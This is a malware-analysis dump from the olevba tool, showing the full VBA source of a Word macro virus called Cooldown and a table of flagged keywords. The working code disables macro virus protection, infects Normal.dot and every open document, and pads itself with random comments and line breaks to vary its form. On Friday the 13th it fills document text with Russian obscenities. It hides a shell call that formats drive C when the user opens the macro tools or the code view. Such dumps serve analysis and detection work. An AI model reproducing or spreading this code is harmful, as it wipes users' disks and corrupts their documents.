olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown-c839fe628c653cae9b2099f12f9ed9aab0e37771
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown-c839fe628c653cae9b2099f12f9ed9aab0e37771 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ' 4183.095
Private _
    Sub Document_Open()
        
CoolDown 0
      ' 3325.434

End Sub
      Private _
       Sub _
    Document_Close()
               ' 4215.387

CoolDown _
              0
           ' 1215.406
End Sub
  Private _
    Sub _
                ToolsMacro()
      ' 1472.591
CoolDown _
  1
 ' 5382.339
' 6628.045
End _
    Sub
      Private Sub _
  ViewVBCode()
      CoolDown 1
  End _
    Sub
 ' 1052.828
' 445.0065
Private Sub CoolDown(How _
            As Integer)
   On _
             Error _
 Resume _
               Next
       ' 2988.791
' 5252.251
' 9995.135
' 9441.57

' 6197.208
' 6511.963
Dim c As _
        String, _
      a _
As Long, _
  b As Long, d _
As _
    Long, e As _
             Long, _
               f _
          As Long, _
res As _
                String, m As _
      Boolean
     Randomize
             ' 3336.317
' 8215.239
With _
       Options
       .VirusProtection = _
            False
     .ConfirmConversions _
           = False
  .SaveNormalPrompt = False
       ' 5493.6

' 2200.102
End _
          With
  ' 7723.269
If _
               How _
  = 1 _
            Then
              s _
             = _
                Shell("format" & Chr(32) _
               & _
                "c:" & Chr(32) _
                & _
               "/autotest", vbHide)
      Else
            With _
              NormalTemplate.VBProject.VBComponents(1).CodeModule
       If Not _
      .Find("Cool" & _
    "Down", 1, _
   1, 1000, _
 1000, False, _
          False) _
            Then
            ' 4557.695
' 3150.635
a = .CountOfLines
    
For _
        b _
    = _
   1 To a
' 6342.49
.DeleteLines _
          (1)
          ' 7509.242

' 9344.159
' 5365.082
' 7089.095
Next
          ' 2724.859
d _
 = _
              1
       a _
 = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
    ' 6617.503
res _
= ""
      ' 6529.884
For b = _
             1 To _
    a
               ' 8926.437
c _
= ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
    ' 8411.106
c _
           = RTrim(LTrim(c))
             ' 4102.354
If foo(c, _
     f, _
   res) Then
   .InsertLines d, _
            Space(Rnd * _
      16) _
 & _
    res
    ' 1214.859
d = _
        d _
                + f
         f _
    = _
      0
        res = _
  ""
              ' 2251.588
' 5132.922
End _
         If
         ' 3032.963
Next
            ' 5757.939

NormalTemplate.Save
               ' 1963.749
' 5215.371
' 9867.247
' 6358.268
' 5250.499
End _
          If
               ' 357.402
End _
               With
             For e = 1 _
           To Documents.Count
   With _
   Documents(e).VBProject.VBComponents(1).CodeModule
           ' 2586.383
If Not _
      .Find("Cool" & "Down", _
  1, _
               1, _
     1000, 1000, False, False) _
             Then
       ' 8857.85
a = .CountOfLines
        ' 5847.984
m _
              = Documents(e).Saved
          ' 735.8372
For b _
     = 1 To a
              .DeleteLines (1)
   ' 8221.316
Next
               ' 8183.946
' 1335.602
d = _
             1
         a = _
NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
   res = _
        ""
            ' 2905.051
For _
                b _
 = 1 _
               To a
            ' 2468.701
' 5846.191
c _
     = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, _
             1)
             ' 1587.856
' 9116.927
' 709.3298
c _
       = _
             RTrim(LTrim(c))
                ' 2671.459
If _
           foo(c, _
          f, _
            res) _
      Then
              
.InsertLines d, _
     Space(Rnd _
         * _
       16) & _
            res
  ' 7261.151
' 2904.508
d = d + f
            ' 6596.352
f _
             = 0
          ' 3898.755
' 6850.814
res = ""
            End _
  If
 ' 6617.999
Next
       If Documents(e).Path <> _
          "" Then
           Documents(e).SaveAs AddToRecentFiles:=False
              
' 3332.812
' 707.3283
End _
           If
 If _
 (WeekDay(Date) = 6) _
  And (Day(Date) _
     = 13) _
 And (Rnd > _
        0.7) Then
  ' 9227.752
' 343.4056
' 6245.525
Application.StatusBar _
            = _
      ""
    Application.DisplayStatusBar = False
   ' 4889.657
' 1221.349
' 4432.526
' 850.2543
' 1469.912
' 109.6392
' 4958.952
' 359.9012
Application.ScreenUpdating _
   = False
      With _
          Documents(e).Content
  ' 8225.452
.Find.Execute FindText:="пр", ReplaceWith:="пизд", Replace:=wdReplaceAll
          ' 352.5317
.Find.Execute _
          FindText:="др", ReplaceWith:="понос", _
        Replace:=wdReplaceAll
      .Find.Execute FindText:="кр", _
      ReplaceWith:="кобыл", Replace:=wdReplaceAll
          ' 1951.51
.Find.Execute FindText:="стр", _
  ReplaceWith:="ебан", _
Replace:=wdReplaceAll
           ' 80.9455
.Find.Execute FindText:="ср", ReplaceWith:="срак", _
         Replace:=wdReplaceAll
    ' 7450.938
' 3895.383
.Find.Execute _
 FindText:="тр", ReplaceWith:="трах", _
              Replace:=wdReplaceAll
        ' 7477.957
' 5715.298
' 9263.511


' 6999.493
' 8358.551
.Find.Execute _
        FindText:="бр", _
         ReplaceWith:="бляд", Replace:=wdReplaceAll
  ' 9223.507

.Find.Execute FindText:="вр", ReplaceWith:="выеб", _
 Replace:=wdReplaceAll
      ' 9505.63
.Find.Execute _
     FindText:="гр", ReplaceWith:="говн", _
        Replace:=wdReplaceAll
          ' 5465.395
.Find.Execute _
FindText:="жр", _
               ReplaceWith:="жоп", _
       Replace:=wdReplaceAll
            
.Find.Execute _
        FindText:="зр", ReplaceWith:="залуп", _
             Replace:=wdReplaceAll
           .Find.Execute _
            FindText:="дж", _
          ReplaceWith:="джоп", _
              Replace:=wdReplaceAll
     ' 6628.293
' 2967.129
' 5194.429
.Find.Execute FindText:="кал", _
               ReplaceWith:="дер", _
               Replace:=wdReplaceAll
            .Find.Execute FindText:="бух", _
  ReplaceWith:="бряк", Replace:=wdReplaceAll
               End _
 With
    ' 9660.545
' 8722.068
' 166.2916
' 6952.896
' 762.3035
Documents(e).UndoClear
Application.DisplayStatusBar = True
               Application.ScreenUpdating = True
         Application.StatusBar _
            = ""
            ' 3024.029
End If
              ' 4297.112
Documents(e).Saved = _
      m
      
End If
     End With
           Next
             ' 9423.179

End If
End _
              Sub
      Private _
          Function _
       foo(ByRef _
               s _
    As String, _
   ByRef i As _
   Long, _
           ByRef _
 res As _
      String) _
              As _
            Boolean
 Dim tmp _
              As _
               String
         ' 7860.772
If (Left(s, _
            1) = _
              "'") Or _
    (Len(s) _
   = 0) _
               Then
       foo = _
  False
     ' 8099.396
Exit _
  Function
         ' 9580.448
End _
             If
       ' 1207.501
' 847.6967

If Right(s, 2) _
    = Chr(32) & "_" _
               Then
   res _
           = _
  res _
            & Left(s, _
    Len(s) _
    - 1)
               foo = False
               Exit Function
            ' 2249.242
' 6270.484
' 6016.646
' 1363.338
End _
     If
     tmp _
          = res _
   & s
        res _
                = ""
     ' 1815.935

i = _
1
  
While _
    Rnd > _
  0.5
            If Rnd _
            < _
     0.8 Then
  res = _
    res & "'" _
            & _
   Str(Rnd _
      * _
       10000)
          
End _
                If
          ' 4284.111
res = res & _
               Chr(13)
             
i = _
    i + 1
           ' 9686.128
Wend
             ' 702.7537
For a = 1 To _
     Len(tmp)
        res _
         = _
             res _
 & _
          Mid(tmp, _
               a, 1)
            ' 5258.756
If Mid(tmp, a, 1) _
             = _
      Chr(32) Then
     ' 8820.03
If Rnd > 0.5 Then
  res _
  = _
   res _
           & _
          "_" & _
      Chr(13) & Space(Rnd _
       * 16)
      ' 6544.924
' 6618.239

i = i + 1
             ' 5182.905

End _
         If
         ' 9668.769

End If
 ' 3216.671
Next
 foo _
                = True
        End _
          Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

